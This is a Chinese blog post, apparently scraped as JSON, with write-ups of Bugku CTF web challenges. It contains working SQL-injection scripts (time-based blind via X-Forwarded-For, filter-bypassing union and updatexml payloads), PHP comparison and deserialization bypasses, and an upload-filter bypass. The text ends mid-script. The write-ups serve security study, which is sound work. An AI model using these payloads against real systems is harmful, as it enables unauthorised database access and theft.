任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))$c += 1;&#125; 要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload 1234567POST:password=42adad;d;;a//非正常的password=42%00或者POST一个任意不等于password的字符暂时不知道什么原因导致的 简单waf网址打不开","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"函数漏洞","slug":"函数漏洞","permalink":"https://sunzhengyu99.github.io/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"},{"name":"绕过","slug":"绕过","permalink":"https://sunzhengyu99.github.io/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"bugku刷题记录2","date":"2020-09-10T01:05:12.000Z","path":"2020/09/10/bugku1/","text":"bugku刷题记录2 速度要快打开页面查看源码什么也没有 抓包看了看，惊喜的发现了flag字段 一段base64 解码后为NDQyMDIy 提交发现并不对。。。看来另有玄机 多go几次后发现了flag值一直在变，并且有一段提示 &lt;!-- OK ,now you have to post the margin what you find --&gt; 用post方法提交你所发现的内容，只好使用脚本（不会写） 123456789101112import requestsimport base64url=&quot;http://120.24.86.145:8002/web6/&quot;r=requests.session()headers=r.get(url).headers#因为flag在消息头里 mid=base64.b64decode(headers[&#x27;flag&#x27;])mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的 flag = base64.b64decode(mid.split(&#x27;:&#x27;)[1])#获得flag:后的值data=&#123;&#x27;margin&#x27;:flag&#125;print (r.post(url,data).text)#post方法传上去 cookie欺骗注意观察urlhttp://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ= line=2&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= 解密是为key.txt line是行的意思，这里应该是查看key.txt的第line行的代码 这里可以查看index.php源码 index.php的base64值为aW5kZXgucGhw 改变line的值可以一行一行的查看源码，可以使用脚本 12345678910import requestsurl1 = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;mysession = requests.session()for i in range(0, 40): r = mysession.get(url1+str(i)+url2) print(r.text) 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET[&#x27;filename&#x27;])?$_GET[&#x27;filename&#x27;]:&quot;&quot;);$line=isset($_GET[&#x27;line&#x27;])?intval($_GET[&#x27;line&#x27;]):0;if($file==&#x27;&#x27;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&#x27;0&#x27; =&gt;&#x27;keys.txt&#x27;,&#x27;1&#x27; =&gt;&#x27;index.php&#x27;,); if(isset($_COOKIE[&#x27;margin&#x27;]) &amp;&amp; $_COOKIE[&#x27;margin&#x27;]==&#x27;margin&#x27;)&#123; //看这里$file_list[2]=&#x27;keys.php&#x27;;&#125; if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;) 这里可以判断cookie必须满足margin=margin才能访问keys.php never give up查看源码提示了 &lt;!--1p.html--&gt; 直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64 1JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ base64解码后为url编码 1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E url解码为源码 12345678910111213141516171819202122232425&lt;?phpf(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;); //注意这里，flag应该藏在这里&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; 果然藏在f4l2a3g.txt 过狗一句话此站没有flag，flag被人删了，不用再做了。–一个做题的路人 flag好像真的被删了，列不出来目录，查看wp也没有复现。 正则？字符？1234567 &lt;?php highlight_file(&#x27;2.php&#x27;);$key=&#x27;KEY&#123;********************************&#125;&#x27;;$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM )&#123; die(&#x27;key is: &#x27;.$key);&#125; preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); 重点在这句话上，考点为正则表达式 定界符：/和/（一般来说是这两个，其实除了\\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：前面的字符重复4~7次； \\ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 因此可以写出符合要求的字符穿 1keyakey22222key:/a/aaakeyb! 前女友(SKCTF)题目网址打不开 login1(SKCTF)题目网址打不开 你从哪里来题目提示 are you from google? 你是从google来的吗 考察http头中的referer参数 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/ 那么就抓包修改referer这个参数 Referer: https://www.google.com/,直接go即可 md5 collision源码 12345678910$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 1234567891011QNKCDZO240610708s878926199as155964671as214587387as214587387a sha1(str)sha1(&#x27;aaroZmOk&#x27;) sha1(&#x27;aaK1STfY&#x27;)sha1(&#x27;aaO8zKZF&#x27;)sha1(&#x27;aa3OFF9m&#x27;) 程序员本地网站见到题目就想到了x-forwarded-for，本地地址可以使用IP:127.0.0.1 可以使用google浏览器的插件 各种绕过题目源码 12345678910111213141516171819&lt;?phphighlight_file(&#x27;flag.php&#x27;);$_GET[&#x27;id&#x27;] = urldecode($_GET[&#x27;id&#x27;]);$flag = &#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;;if (isset($_GET[&#x27;uname&#x27;]) and isset($_POST[&#x27;passwd&#x27;])) &#123; if ($_GET[&#x27;uname&#x27;] == $_POST[&#x27;passwd&#x27;]) print &#x27;passwd can not be uname.&#x27;; else if (sha1($_GET[&#x27;uname&#x27;]) === sha1($_POST[&#x27;passwd&#x27;])&amp;($_GET[&#x27;id&#x27;]==&#x27;margin&#x27;)) die(&#x27;Flag: &#x27;.$flag); else print &#x27;sorry!&#x27;;&#125;?&gt; 首先看一下要传入哪些变量 get:id uname post:passwd id需要进行一次urldecode，解码的值为margin uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。 payload 123456urlencode(margin)=%6D%61%72%67%69%6Euname[]=1passwd[]=2GET: id=%6D%61%72%67%69%6E&amp;uname[]=1POST:passwd[]=2 web8123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;&#125;else&#123;echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;&#125;&#125;?&gt; extract函数作用 (PHP 4, PHP 5, PHP 7) extract — 从数组中将变量导入到当前的符号表 说明 extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) : int 本函数用来将变量从数组中导入到当前的符号表中。 检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 trim (PHP 4, PHP 5, PHP 7) trim — 去除字符串首尾处的空白字符（或者其他字符） 说明 trim ( string $str [, string $character_mask = “ \\t\\n\\r\\0\\x0B” ] ) : string 此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： “ “ (ASCII 32 (0x20))，普通空格符。 “\\t” (ASCII 9 (0x09))，制表符。 “\\n” (ASCII 10 (0x0A))，换行符。 “\\r” (ASCII 13 (0x0D))，回车符。 “\\0” (ASCII 0 (0x00))，空字节符。 “\\x0B” (ASCII 11 (0x0B))，垂直制表符。 file_get_contents (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7) file_get_contents — 将整个文件读入一个字符串 代码的大致含义就是 get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag 这里需要利用php的伪协议写入内容 php://input payload 12GET: ac=111&amp;fn=php://inputPOST: 111 细心题目网站崩了 求getshell文件上传 首先先上传一个图片文件，上传成功了并返回保存路径 再上传一个php的文件，提示Invalid file 上传.htaccess, .user.ini都提示you got it 两种提示不一样猜测可能存在后缀黑名单和文件类型检测。 上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file 再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag 考察知识点： 请求中的Content-Type 在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。 设置请求头中的Content-Type 当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。 INSERT INTO注入提示了insert into注入 并给出了源码 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);function getIp()&#123;$ip = &#x27;&#x27;;if(isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))&#123; //判断是否存在xxf$ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]; //存在则优先使用xxf&#125;else&#123;$ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; //remote_addr &#125;$ip_arr = explode(&#x27;,&#x27;, $ip); //过滤 ,return $ip_arr[0];&#125;$host=&quot;localhost&quot;;$user=&quot;&quot;;$pass=&quot;&quot;;$db=&quot;&quot;;$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);//连接数据库mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip = getIp();echo &#x27;your ip is :&#x27;.$ip;$sql=&quot;insert into client_ip (ip) values (&#x27;$ip&#x27;)&quot;; //注入点mysql_query($sql);?&gt; 网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。 抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注 1$ip_arr = explode(&#x27;,&#x27;, $ip); //过滤了, 代替if的注入语句如下 12select case when 语句1 then 语句2 else 语句3 end;//含义很好理解，就是当语句1为真时，执行语句2，否则执行语句3 所以要构造的注入语句为 1211&#x27;+(select case when length(database())=5 then sleep(5) else 0 end))%23//当数据库名的长度为5时，则执行sleep(5)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确 带入原语句 123insert into client_ip (ip) values (&#x27;$ip&#x27;)insert into client_ip (ip) values (&#x27;11&#x27;+(select case when length(database())=5 then sleep(5) else 0 end))%23//可以看到语句成功注入到原查询语句中，并可以正常执行 判断字段每一个字符的值 常用的语句应该为 11&#x27; and (case when (substr(select database()),1,1)=&#x27;c&#x27; then sleep(5) else 1 end) # 但是因为逗号被过滤了，所以改为下面的语句 11&#x27; and (case when (substr(select database()) from 1 for 1)=&#x27;c&#x27; then sleep(5) else 1 end) # 123456789101112131415161718192021222324252627# -*- coding:utf-8 -*-import requestsimport sys#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+##client_ip,flag#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+sql = &quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;url = &#x27;http://123.206.87.240:8002/web15/&#x27;flag = &#x27;&#x27;for i in range(1, 40): print(str(i)) for ch in range(32, 129): if ch == 128: sys.exit(0) sqli = sql.format(i, chr(ch)) header = &#123; &#x27;X-Forwarded-For&#x27;: sqli &#125; try: html = requests.get(url, headers=header, timeout=3) #响应时间超过3秒则 进入except 即可猜测是正确的 except: flag += chr(ch) print(flag) break 这是一个神奇的登陆框网址打不开 多次tips 本题有2个flagflag均为小写flag格式 flag{} 看到题目提示，应该是二次注入 url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 There is nothing 输入 id=1’or 1=1–+ 报错 但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。 1231&#x27;^(length(&#x27;union&#x27;)!=0)--+页面显示错误正常说明length(&#x27;union&#x27;)!=0是错的，即length(&#x27;union&#x27;)=0，说明union替换为空了其他关键词的测试也类似 开始注入 1234567891011-1&#x27; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+database:flag1,hint-1&#x27; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag1&#x27;--+table:flag1,address-1&#x27; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入-1&#x27; ununionion seselectlect 1,group_concat(address) from flag1 --+拿到下一关的地址 同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入 报错注入一般是固定的模板 下面使用updatexml()进行注入 函数语法：updatexml(XML_document, XPath_string, new_value); 适用版本: 5.1.5+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 我们通常在第二个xpath参数填写我们要查询的内容。 payload 123456781&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;~&#x27;),3) %23database:~class,flag2~ ?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag2&#x27;),&#x27;~&#x27;),3) %23table:~flag2,address~# 查数据?id=1&#x27; and updatexml(1,concat(&#x27;0x7e&#x27;,(select flag2 from flag2),&#x27;0x7e&#x27;),3) %23 拿到真正的flag PHP_encrypt_1(ISCCCTF)题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可 加密后的数据为 1fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5(&#x27;ISCC&#x27;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 解密脚本如下 1234567891011121314151617181920212223242526272829&lt;?phpfunction decode($str)&#123; $key = md5(&#x27;ISCC&#x27;); // 对密钥进行md5加密 $x=0; $str=base64_decode($str); //对加密后的字符串base64解码 $len=strlen($str); $klen=strlen($key); for($i=0;$i&lt;$len;$i++) //计算出char字符数组，用于最后的减操作 &#123; if($x==$klen) &#123; $x=0; &#125; $char.=$key[$x]; $x+=1; &#125; for($i=0;$i&lt;$len;$i++) &#123; $data.=chr((ord($str[$i])-ord($char[$i])+128)%128); //加上128为了防止出现负数。 &#125; return $data;&#125;echo(decode(&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;));?&gt; 文件包含2网址打不开 flag.php给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;]; &#x2F;&#x2F;含cookie 可能需要抓包修改cookieif(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt; 代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了 直接构造 1ISecer=s:21:&quot;ISecer:www.isecer.com&quot;; 但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL 所以真正的payload： 1ISecer=s:0:&quot;&quot;; 请求头 12345678GET /flagphp/ HTTP/1.1Host: 123.206.87.240:8002User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3DNT: 1Cookie: ISecer=s:0:&quot;&quot;;Connection: close sql注入2提示： 全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,% 带有过滤的sql注入 先测试一下过滤哪些字符 测试发现 or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符 测试还可以发现，当uname=admin&amp;passwd=111时提示的password error , 但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。 当uname=admin’-1-‘&amp;passwd=11时为false 当uname=admin’-0-‘&amp;passwd=1时为true 所以猜测sql查询语句为 1$sql &#x3D; select * from users where username&#x3D;$username; 尝试构造注入语句1ascii(substr((select database(),1,1)))&gt;50 上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置 但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句 1ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0 reverse 为字符串反转函数 确定盲注的判断条件 当上面的语句成立时返回的是 username error 不成立时返回的是password error 编写脚本 因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位 123456789101112131415import requestsurl = &quot;http://123.206.87.240:8007/web2/login.php&quot;cookie =&#123;&#x27;PHPSESSID&#x27;:&#x27;r3rln64ialiqjnefpa6qu5a0t513t8rs&#x27;&#125;password = &quot;&quot;for i in range(1,33): for j in &#x27;0123456789abcdef&#x27;: payload = &quot;admin&#x27;-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-&#x27;&quot;.format(i,ord(j)) data=&#123;&#x27;uname&#x27;:payload,&#x27;passwd&#x27;:&quot;111&quot;&#125; res = requests.post(url=url,cookies=cookie,data=data) if &quot;username&quot; in res.text: password +=j #print(password) breakprint(password) 12005b81fd960f61505237dbb7a3202910md5在线解码后为admin123 登录后即可用ls命令，就可以拿到flag 这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破 参考叶师傅：https://xz.aliyun.com/t/2583 孙xx的博客进入页面是一个博客的页面，有搜索功能，没有思路 于是扫描目录 但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做 Trim的日记本tips:不要一次就放弃 是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法 那就万事不觉扫以下 还真有发现 扫到三个目录 login.php register.php show.php 访问show.php,拿到flag login2(SKCTF) login3 文件上传2 login4题目都挂了 江湖魔头提示:学会如来神掌就可以打败他了吧 进入题目发现还真像是游戏的界面 包含属性 练功 商店 赚钱 讨伐 退出 几个页面 其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag 查看源码 在wulin.php中可以看到三个js文件 123456789101112131415161718192021//script.js 在线格式化后的结果eval(function(p, a, c, k, e, r) &#123; e = function(c) &#123; return (c &lt; 62 ? &#x27;&#x27; : e(parseInt(c / 62))) + ((c = c % 62) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36)) &#125;; if (&#x27;0&#x27;.replace(0, e) == 0) &#123; while (c--) r[e(c)] = k[c]; k = [function(e) &#123; return r[e] || e &#125;]; e = function() &#123; return &#x27;[57-9abd-hj-zAB]&#x27; &#125;; c = 1 &#125;; while (c--) if (k[c]) p = p.replace(new RegExp(&#x27;\\\\b&#x27; + e(c) + &#x27;\\\\b&#x27;, &#x27;g&#x27;), k[c]); return p&#125;(&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\\&#x27;;\\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\\&#x27;;\\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\\&#x27;&quot;\\&#x27;,&quot;&quot;).B(\\&#x27;&quot;\\&#x27;,&quot;&quot;);9.write(\\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;, [], 38, &#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;.split(&#x27;|&#x27;), 0, &#123;&#125;)) 可以看到function(p, a, c, k, e, r)函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。 12(&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\\&#x27;;\\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\\&#x27;;\\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\\&#x27;&quot;\\&#x27;,&quot;&quot;).B(\\&#x27;&quot;\\&#x27;,&quot;&quot;);9.write(\\&#x27;&lt;img id=&quot;f-1&quot; 